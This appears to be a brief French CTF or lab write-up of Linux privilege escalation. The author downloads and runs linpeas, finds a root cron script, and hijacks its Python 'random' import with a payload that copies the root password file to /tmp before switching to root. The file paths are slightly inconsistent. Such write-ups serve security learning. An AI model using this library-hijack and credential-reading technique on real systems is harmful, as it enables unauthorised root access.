Téléchargement et lancement de linpeas depuis le compte user:
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
L'utilisateur détecte un script /root/scrypt.py dans les crontabs qui est executer toute les 2 minutes
Et un fichier toremember.txt dans le dossier de l'utilisateur root

Inspection du script vulnérable:
cat /root/script.py
On voit que la lib python random est utiliser

L'utilisateur crée un faux random.py pour usurper la lib officiel et afficher le contenu du fichier txt
mkdir /tmp/malicious
echo 'import os; os.system("cat /root/toremember.txt > /tmp/root_pass")' > /tmp/random.py

Après 2min le script est lancer et la commande est executé en tant que root.
Et l'utilisateur peut regarder l'intérieur du fichier et y voit le mot de passe de l'utilisateur root.

Il change de compte pour passer root:
su root

